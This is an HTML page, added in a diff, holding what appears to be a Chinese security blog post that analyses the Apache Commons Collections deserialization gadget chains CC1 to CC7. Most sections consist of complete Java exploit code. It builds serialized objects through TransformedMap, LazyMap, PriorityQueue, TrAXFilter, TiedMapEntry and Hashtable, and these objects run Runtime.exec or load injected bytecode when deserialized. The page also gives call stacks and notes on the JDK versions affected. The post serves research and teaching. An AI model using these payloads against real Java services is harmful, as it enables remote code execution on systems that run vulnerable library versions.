@@ -1,0 +1,712 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Commons Collections利用链 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Commons Collections利用链 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="介绍
+
+Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Commons Collections利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-05-09
+              </span>
+              <span>
+                19 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="介绍">介绍</h1>
+<blockquote>
+<p><a href="https://commons.apache.org/proper/commons-collections/index.html">Apache Commons Collections</a> 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种 Java 应用的开发。</p>
+</blockquote>
+<h1 id="cc1">CC1</h1>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="abstractmapdecorator">AbstractMapDecorator</h3>
+<blockquote>
+<p>首先 CC 库中提供了一个抽象类 <code>org.apache.commons.collections.map.AbstractMapDecorator</code>，这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map。<br>
+这个类有很多实现类，各个类触发的方式不同，重点关注的是 TransformedMap 以及 LazyMap。</p>
+</blockquote>
+<h3 id="transformedmap">TransformedMap</h3>
+<p>org.apache.commons.collections.map.TransfrmedMap类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer来定义，Transformer在TransformedMa实例化时作为参数传入。</p>
+<pre><code class="language-java">public class TransfromedMapTest {
+    private static Transformer ValueTransformer = input -&gt; {
+        String s = input.toString();
+        return s + &quot;test&quot;;
+    };
+    private static Transformer KeyTransformer = input -&gt; {
+        int num = (int) input;
+        num++;
+        return (Object) num;
+    };
+
+    public static void main(String[] args) throws Exception {
+        HashMap&lt;Integer, String&gt; map = new HashMap&lt;&gt;();
+        Map map1 = TransformedMap.decorate(map, KeyTransformer, ValueTransformer);
+        map1.put(1, &quot;ljzz&quot;);
+        map1.put(2, &quot;123&quot;);
+        System.out.println(map1);
+    }
+}
+</code></pre>
+<p>执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1652603867221.png" alt="" loading="lazy"><br>
+也就是说当TransformedMap内的key或者value发生变化时(例如调用TransformedMap的put方法时)，就会触发相应参数的Transformer的transform()方法。</p>
+<h3 id="lazymap">LazyMap</h3>
+<p>其get方法在找不到其key值时则会调用传入的Transformer的transform()方法，并且put到map中。</p>
+<pre><code class="language-java">    public Object get(Object key) {
+        // create value for key if key is not currently in the map
+        if (map.containsKey(key) == false) {
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        }
+        return map.get(key);
+    }
+</code></pre>
+<pre><code class="language-java">private static Transformer ValueTransformer = input -&gt; {
+    String s = input.toString();
+    return s + &quot;test&quot;;
+};
+public static void main(String[] args) throws Exception {
+    HashMap&lt;Integer, String&gt; map = new HashMap&lt;&gt;();
+    Map map1 = LazyMap.decorate(map, ValueTransformer);
+    map1.get(&quot;ljzz&quot;);
+    System.out.println(map1);
+}
+</code></pre>
+<p>或者：</p>
+<pre><code class="language-java">public class TransfromedMapTest {
+    public static class ValueTransformer1 implements Transformer{
+
+        @Override
+        public Object transform(Object input) {
+            String s = input.toString();
+            return s + &quot;test&quot;;
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        HashMap&lt;Integer, String&gt; map = new HashMap&lt;&gt;();
+        Map map1 = LazyMap.decorate(map, new ValueTransformer1());
+        map1.get(&quot;ljzz&quot;);
+        System.out.println(map1);
+    }
+}
+
+</code></pre>
+<p>执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1652603894967.png" alt="" loading="lazy"><br>
+需要关注的Transformer实现类：</p>
+<h3 id="invokertransformer">InvokerTransformer</h3>
+<p>其transform方法会获取input的Class对象并且根据iMethodName字段和iParamTypes执行该对应参数和参数名的方法，这两个参数是通过构造函数进行初始化的。<br>
+<img src="https://1jzz.github.io/post-images/1652603900181.png" alt="" loading="lazy"></p>
+<h3 id="chainedtransformer">ChainedTransformer</h3>
+<p>通过构造函数初始化iTransformers字段，并且其transform方法对这个数组的的transform方法，其第一个传入transform方法的值由上一个调用的transform方法传入。<br>
+这样就可以将所有的transform方法当作一个链式调用<br>
+<img src="https://1jzz.github.io/post-images/1652603905412.png" alt="" loading="lazy"></p>
+<h3 id="constanttransformer">ConstantTransformer</h3>
+<p>不管传入的input参数，而只是返回在构造函数初始化生成的iConstant字段。<br>
+<img src="https://1jzz.github.io/post-images/1652603910626.png" alt="" loading="lazy"></p>
+<h2 id="利用链构造">利用链构造</h2>
+<p>因为Runtime类并未实现Serialize接口，所以无法在反序列化的过程中需要通过反射来获取其对应的方法并且执行。<br>
+通过ChainTransformer来构造出Runtime.class.getMethod(&quot;&quot;)</p>
+<pre><code class="language-java">Transformer[] transformers = new Transformer[] {
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+    new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+    new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
+};
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+HashMap&lt;Integer, String&gt; map = new HashMap&lt;&gt;();
+Map map1 = TransformedMap.decorate(map, null, chainedTransformer);
+map1.put(1, &quot;ljzz&quot;);
+</code></pre>
+<p>其效果与如下代码一致：</p>
+<pre><code class="language-java">Method m = Runtime.class.getMethod(&quot;getRuntime&quot;);
+Runtime rt = (Runtime) m.invoke(m);
+rt.exec(&quot;calc.exe&quot;);
+</code></pre>
+<p>接下来我们要寻找一个重写了readObject的类，并且可以将我们的TransformedMap对象传进去，在这个类的readObject方法中调用了传入的TransformedMap对象中的put方法或者checkSetValue方法(调用了transform方法)。<br>
+最终找到了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类。这个类实现了InvocationHandler接口，原本是用于JDK对于注解形式的动态代理。<br>
+我们来看一下这个类的代码，首先是构造函数，传入我们的TransformedMap对象：<br>
+其参数列表分别为一个实现了Annotation接口的Class类，和一个Map&lt;String, Object&gt;对象。并且在构造函数的代码中对type进行判断，如果为不为Annotation.class并且只实现了Annotation接口的type才进行赋值操作。这样我们的TransformedMap对象就被成功赋值了。<br>
+<img src="https://1jzz.github.io/post-images/1652603916769.png" alt="" loading="lazy"><br>
+接下来查看该类实现的readObject方法中执行的代码：<br>
+<img src="https://1jzz.github.io/post-images/1652603921941.png" alt="" loading="lazy"><br>
+这里先是调用AnnotationType.getInstance(type)方法实例化AnnotationType对象，然后获取memberType属性(需要注意这里实现Annotation接口的对象需要由成员变量或者方法)，这个属性是一个Map。<br>
+然后遍历memberValues，最终的出发点是在<code>memberVlaue.setValue()</code>，然后调用了<code>TransformedMap.checkSetValue()</code>方法调用<code>valueTransformer.transform(value)</code><br>
+payload：</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    Transformer[] transformers = new Transformer[] {
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+        new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+        new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
+    };
+    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+    HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+    map.put(&quot;value&quot;, &quot;123&quot;);
+    Map map1 = TransformedMap.decorate(map, null, chainedTransformer);
+
+    Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+    constructor.setAccessible(true);
+    InvocationHandler ih = (InvocationHandler) constructor.newInstance(Retention.class, map1);
+
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+    ObjectOutputStream oos = new ObjectOutputStream(bos);
+    oos.writeObject(ih);
+    oos.close();
+
+    ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
+    ObjectInputStream ois = new ObjectInputStream(bis);
+    ois.readObject();
+    ois.close();
+}
+</code></pre>
+<ol>
+<li>需要在map中添加数据，而不是map1中添加数据，因为如果在map1中添加数据会在序列化过程中执行命令，造成干扰。并且添加数据中的key要为传入AnnotationInvocationHandler构造函数中的Class对象的成员变量或方法的名字</li>
+<li>传入AnnotationInvocationHandler构造函数中的Class需要为Annotation的实现类，并且需要有成员变量或者成员函数，其名字作为HashMap中的key值</li>
+<li>AnnotationInvocationHandler类需要使用反射获取其特定参数列表的构造函数并且传入特定的Class对象以及TransformedMap</li>
+</ol>
+<p>调用堆栈：</p>
+<pre><code class="language-java">transform:126, InvokerTransformer (org.apache.commons.collections.functors)
+transform:123, ChainedTransformer (org.apache.commons.collections.functors)
+checkSetValue:204, TransformedMap (org.apache.commons.collections.map)
+setValue:192, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)
+readObject:451, AnnotationInvocationHandler (sun.reflect.annotation)
+</code></pre>
+<p>除了使用<code>AnnotationInvoationHandler.readObject()</code>方法之外还可以使用AnnotationInvocationHandler作为动态代理然后再实例化一次，可以将代理对象传入，在反序列化的过程中进行初始化时调用了LazyMap.get方法从而触发payload。<br>
+payload：</p>
+<pre><code class="language-java">Transformer[] fakeTransformer = new Transformer[]{};
+Transformer[] transformer = new Transformer[] {
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class}, new Object[] {&quot;getRuntime&quot;, null}),
+        new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class}, new Object[] {null, null}),
+        new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class}, new Object[] {&quot;calc.exe&quot;})
+};
+ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
+HashMap map = new HashMap();
+Map map1 = LazyMap.decorate(map, chainedTransformer);
+
+Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, map1);
+Map proxy = (Map) Proxy.newProxyInstance(map1.getClass().getClassLoader(), LazyMap.class.getInterfaces(), handler);
+
+InvocationHandler proxyHandler = (InvocationHandler) constructor.newInstance(Retention.class, proxy);
+Field iTransformer = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+iTransformer.setAccessible(true);
+iTransformer.set(chainedTransformer, transformer);
+
+ByteArrayOutputStream bos = new ByteArrayOutputStream();
+ObjectOutputStream oos = new ObjectOutputStream(bos);
+oos.writeObject(proxyHandler);
+oos.close();
+
+ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
+ObjectInputStream ois = new ObjectInputStream(bis);
+ois.readObject();
+ois.close();
+</code></pre>
+<ol>
+<li>使用Proxy.newProxyInstance方法在对LazyMap对象map1进行代理</li>
+<li>然后再生成一个AnnotationInvocation对象，将这个代理对象传入，在该对象进行反序列化的过程中会调用代理对象中的entrySet方法</li>
+<li>进入代理类的handler中的invoke方法，调用了get方法(<code>LazyMap#get()</code>)触发payload</li>
+</ol>
+<p>注意：AnnotationInvocationHandler的invoke方法中如果代理调用的方法有参数列表带有参数就会直接抛出异常，并且在调用LazyMap.get方法的过程中如果key存在则不会调用transform方法。</p>
+<h2 id="限制">限制</h2>
+<p>JDK1.8.71及以后修改了AnnotationInvocationHandler类的readObject方法。</p>
+<ul>
+<li>取消了setValue方法，无法通过TransformedMap来调用transform方法</li>
+<li>memberValue字段new了一个LinkedHashMap来进行取代，无法使用我们自己传入的LazyMap，故无法调用LazyMap.get()。</li>
+</ul>
+<h1 id="cc2">CC2</h1>
+<h2 id="前置知识-2">前置知识</h2>
+<h3 id="priorityqueue">PriorityQueue</h3>
+<p>PriorityQueue优先级队列是基于优先级堆(a priority heap)的一种特殊队列，它给每个元素定义&quot;优先级&quot;，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。<br>
+因此，放入PriorityQueue的元素，必须实现Comparable接口，PriorityQueue会根据元素的排序顺序决定出队的优先级。如果没有实现Comparable接口，PriorityQueue还允许我们提供一个Comparator对象来判断两个元素的顺序。<br>
+PriorityQueue支持反序列化，在重写的readObject方法中，将数据反序列化到queue中之后，会调用heapify()方法来对数据进行排序。<br>
+<img src="https://1jzz.github.io/post-images/1652603939663.png" alt="" loading="lazy"><br>
+heapify调用了sifeDown方法，在sifeDown方法中，如果有指定的Comparator则使用comparator.compara()方法进行排序，如果没有的话就调用siftDownComparable方法进行默认的比较(需要实现Comparable接口的compareTo方法)。</p>
+<h3 id="transformingcomparator">TransformingComparator</h3>
+<p>TransformingComparator看类名是触发这个漏洞的关键点，这个类实现了Comparator接口。<br>
+TransformingComparator看类名就类似TransformedMap，实际作用也跟TransformedMap类似，TransformedMap是对Map进行装饰，而TransformingComparator是对Comparator进行一个装饰。<br>
+TransformingComparator初始化时传入一个Transformer以及一个Comparator对象或者只传入一个Transformer对象。</p>
+<h2 id="利用链构造-2">利用链构造</h2>
+<p>有过CC1payload的构造经历，对于CC2的利用链构造来说并不算难</p>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    Transformer[] fakeTransformer = new Transformer[] {};
+    Transformer[] transformers = new Transformer[] {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class}, new Object[] {null, null}),
+            new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[] {&quot;calc.exe&quot;})
+    };
+    ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
+    TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+    PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
+    priorityQueue.offer(1);
+    priorityQueue.offer(2);
+
+    Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+    iTransformers.setAccessible(true);
+    iTransformers.set(chainedTransformer, transformers);
+
+    ByteArrayOutputStream barr = new ByteArrayOutputStream();
+    ObjectOutputStream oos = new ObjectOutputStream(barr);
+    oos.writeObject(priorityQueue);
+    oos.close();
+
+    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+    ois.readObject();
+    ois.close();
+}
+</code></pre>
+<h2 id="cc2之templatesimpl利用链">CC2之TemplatesImpl利用链</h2>
+<p>之前分析fastjson不出网时分析了这条利用链，采用的是直接将字节码进行加载(最终执行defineTransletClasses方法)，由于传入的是Transformer而不是Transformer[]，所以直接将TemplatesImpl对象调用offer方法放入队列中，然后将该恶意对象直接传入到transform方法中，只需要一个InvokeTransformer调用newTransformer方法即可触发恶意字节码进行defineClass加载静态代码块</p>
+<pre><code class="language-java">public class CC2Test1 {
+    public static void main(String[] args) throws Exception {
+        byte[] code = getBytecodes();
+        TemplatesImpl ti = new TemplatesImpl();
+        setFieldValue(&quot;_bytecodes&quot;, ti, new byte[][]{code});
+        setFieldValue(&quot;_tfactory&quot;, ti, new TransformerFactoryImpl());
+        setFieldValue(&quot;_name&quot;, ti, &quot;1jzz&quot;);
+        Transformer fakeTransformer = new InvokerTransformer(&quot;toString&quot;, null, null);
+        Transformer transformers = new InvokerTransformer(&quot;newTransformer&quot;, null, null);
+        TransformingComparator comparator = new TransformingComparator(fakeTransformer);
+        PriorityQueue queue = new PriorityQueue(comparator);
+        queue.offer(ti);
+        queue.offer(ti);
+
+        setFieldValue(&quot;transformer&quot;, comparator, transformers);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        ois.readObject();
+        ois.close();
+    }
+
+    private static byte[] getBytecodes() throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(shiro.Evil.class.getName());
+        return clazz.toBytecode();
+    }
+
+    public static void setFieldValue(String fieldName,Object obj, Object value) throws NoSuchFieldException, IllegalAccessException {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
+</code></pre>
+<h1 id="cc3">CC3</h1>
+<p>使用CC1中的AnnotationInvocationHandler对LazyMap进行代理，在反序列化时触发了LazyMap的get方法，调用了transform方法。<br>
+使用CC2中的TemplatesImpl的newTransformer方法触发define Class类触发payload。<br>
+中间寻找了其他类触发newTransformer方法。</p>
+<h2 id="前置知识-3">前置知识</h2>
+<h3 id="traxfilter">TrAXFilter</h3>
+<p>在 SAX API 中提供了一个过滤器接口 org.xml.sax.XMLFilter，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。<br>
+com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates/TransformerImpl/TransformerHandlerImpl 属性。<br>
+<img src="https://1jzz.github.io/post-images/1652603959870.png" alt="" loading="lazy"><br>
+可以看到，在其构造方法中传入了一个Templates对象，然后调用了其newTransformer()方法，可以直接触发payload。</p>
+<h2 id="利用链构造-3">利用链构造</h2>
+<pre><code class="language-java">        byte[] code = getBytecodes();
+        TemplatesImpl ti = new TemplatesImpl();
+        setFieldValue(ti, &quot;_bytecodes&quot;, new byte[][] {code});
+        setFieldValue(ti, &quot;_name&quot;, &quot;1jzz&quot;);
+        setFieldValue(ti, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        Transformer[] fakeTransformers = new Transformer[] {};
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[] {Templates.class}, new Object[] {ti})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
+        Map map = new HashMap();
+        Map map1 = LazyMap.decorate(map, chainedTransformer);
+        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, map1);
+        Map proxy = (Map) Proxy.newProxyInstance(map1.getClass().getClassLoader(), map1.getClass().getInterfaces(), invocationHandler);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, proxy);
+        setFieldValue(chainedTransformer, &quot;iTransformers&quot;, transformers);
+</code></pre>
+<p>将代理对象传入AnnotationInvocationHandler构造函数进行实例化，可以借助其readObject方法中一系列初始化的操作调用LazyMap.get方法触发payload。</p>
+<h1 id="cc4">CC4</h1>
+<p>使用CC2中的 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer，再利用CC3中的 TrAXFilter调用TemplatesImpl的newTransformer方法。</p>
+<h2 id="利用链构造-4">利用链构造</h2>
+<pre><code class="language-java">byte[] code = getBytecodes();
+TemplatesImpl ti = new TemplatesImpl();
+setFieldValue(ti, &quot;_bytecodes&quot;, new byte[][] {code});
+setFieldValue(ti, &quot;_name&quot;, &quot;1jzz&quot;);
+setFieldValue(ti, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+Transformer[] fakeTransformers = new Transformer[] {};
+Transformer[] transformers = new Transformer[] {
+    new ConstantTransformer(TrAXFilter.class),
+    new InstantiateTransformer(new Class[] {Templates.class}, new Object[] {ti})
+    };
+ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
+Comparator comparator = new TransformingComparator(chainedTransformer);
+PriorityQueue pq = new PriorityQueue(comparator);
+pq.offer(1);
+pq.offer(2);
+</code></pre>
+<h1 id="cc5">CC5</h1>
+<p>CC5 依旧是 LazyMap 加 ChainedTransformer ，只不过不再使用 AnnotationInvocationHandler 的动态代理来触发 LazyMap 的 get ，而是找到了其他类的readObject调用<code>LazyMap#get()</code>。<br>
+TiedMapEntry在初始化时传入一个Map对象和一个key值，其getValue方法可以调用传入Map的get方法，如果我们传入了一个LazyMap对象，那就是调用<code>LazyMap#get()</code>。<br>
+该类中调用了getValue方法的方法有：setValue、hashCode、toString。<br>
+在CC5中找到了<code>BadAttributeValueExpException#readObject()</code>方法来调用<code>TiedMapEntry#toString()</code>，前提是<code>System.getSecurityManager() == null</code>。</p>
+<h2 id="利用链构造-5">利用链构造</h2>
+<pre><code class="language-java">Transformer[] transformers = new Transformer[] {
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer(&quot;getMethod&quot;,
+                           new Class[] {String.class, Class[].class}, new Object[] {&quot;getRuntime&quot;, null}),
+    new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[] {null, null}),
+    new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class}, new Object[] {&quot;calc&quot;})
+    };
+ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+Map map = new HashMap();
+Map map1 = LazyMap.decorate(map, chainedTransformer);
+TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, &quot;1jzz&quot;);
+BadAttributeValueExpException bv = new BadAttributeValueExpException(&quot;1jzz&quot;);
+
+setFiledValue(bv, &quot;val&quot;, tiedMapEntry);
+</code></pre>
+<h1 id="cc6">CC6</h1>
+<p>CC6中通过<code>TiedMapEntry#hashCode()</code>调用transform方法。<br>
+查找readObject方法中中调用了hashCode方法类，例如HashMap、HashSet。其中HashSet实际上还是调用<code>HashMap#put()</code>方法。</p>
+<h2 id="利用链构造-6">利用链构造</h2>
+<p>通过HashMap触发</p>
+<pre><code class="language-java">Transformer[] fakeTransformer = new Transformer[]{};
+Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+    new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+    new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})
+    };
+ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
+Map map1 = LazyMap.decorate(new HashMap(), chainedTransformer);
+TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, &quot;1jzz&quot;);
+Map map = new HashMap();
+map.put(tiedMapEntry, 1);
+//用于清除map.put对LazyMap的影响，否则会存在该key，则无法执行transform方法
+map1.clear();
+
+setFiledValue(chainedTransformer, &quot;iTransformers&quot;, transformers);
+</code></pre>
+<p>通过HashSet触发(通过new一个HashMap，然后调用了其put方法)：</p>
+<pre><code class="language-java">Transformer[] fakeTransformer = new Transformer[]{};
+Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+    new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+    new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})
+    };
+ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
+Map map1 = LazyMap.decorate(new HashMap(), chainedTransformer);
+TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, &quot;1jzz&quot;);
+HashSet map = new HashSet&lt;&gt;();
+map.add(tiedMapEntry);
+//用于清除map.put对LazyMap的影响，否则会存在该key，则无法执行transform方法
+map1.clear();
+
+setFiledValue(chainedTransformer, &quot;iTransformers&quot;, transformers);
+</code></pre>
+<h1 id="cc7">CC7</h1>
+<p>CC7 依旧是寻找 readObject方法中调用了hashCode方法的类，这次用到了 Hashtable，与CC6没有什么区别。</p>
+<h2 id="利用链构造-7">利用链构造</h2>
+<pre><code class="language-java">Transformer[] fakeTransformer = new Transformer[]{};
+Transformer[] transformers = new Transformer[]{
+    new ConstantTransformer(Runtime.class),
+    new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+    new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+    new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})
+    };
+ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
+Map map1 = LazyMap.decorate(new HashMap(), chainedTransformer);
+TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, &quot;1jzz&quot;);
+Map map = new Hashtable();
+map.put(tiedMapEntry, &quot;1jzz&quot;);
+map1.clear();
+
+setFiledValue(chainedTransformer, &quot;iTransformers&quot;, transformers);
+</code></pre>
+<h1 id="总结">总结</h1>
+<table>
+<thead>
+<tr>
+<th>CommonsCollections1</th>
+<th>@frohoff</th>
+<th>commons-collections:3.2.1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CommonsCollections2</td>
+<td>@frohoff</td>
+<td>commons-collections4:4.0</td>
+</tr>
+<tr>
+<td>CommonsCollections3</td>
+<td>@frohoff</td>
+<td>commons-collections:3.2.1</td>
+</tr>
+<tr>
+<td>CommonsCollections4</td>
+<td>@frohoff</td>
+<td>commons-collections4:4.0</td>
+</tr>
+<tr>
+<td>CommonsCollections5</td>
+<td>@matthias_kaiser, @jasinner</td>
+<td>commons-collections:3.2.1</td>
+</tr>
+<tr>
+<td>CommonsCollections6</td>
+<td>@matthias_kaiser</td>
+<td>commons-collections:3.2.1</td>
+</tr>
+<tr>
+<td>CommonsCollections7</td>
+<td>@scristalli, @hanyrax, @EdoardoVignati</td>
+<td>commons-collections:3.2.1</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>commons-collections4在4.1版本中就修复了漏洞，因此只有一个版本存在漏洞，而commons-collections就只有3.2.2版本不存在该漏洞，相比来说影响范围更大，并且存在利用的可能性更高</li>
+</ul>
+<h1 id="参考">参考</h1>
+<p><a href="https://su18.org/post/ysoserial-su18-2/">https://su18.org/post/ysoserial-su18-2/</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#cc1">CC1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#abstractmapdecorator">AbstractMapDecorator</a></li>
+<li><a href="#transformedmap">TransformedMap</a></li>
+<li><a href="#lazymap">LazyMap</a></li>
+<li><a href="#invokertransformer">InvokerTransformer</a></li>
+<li><a href="#chainedtransformer">ChainedTransformer</a></li>
+<li><a href="#constanttransformer">ConstantTransformer</a></li>
+</ul>
+</li>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0">利用链构造</a></li>
+<li><a href="#%E9%99%90%E5%88%B6">限制</a></li>
+</ul>
+</li>
+<li><a href="#cc2">CC2</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2">前置知识</a>
+<ul>
+<li><a href="#priorityqueue">PriorityQueue</a></li>
+<li><a href="#transformingcomparator">TransformingComparator</a></li>
+</ul>
+</li>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E9%80%A0-2">利用链构造</a></li>
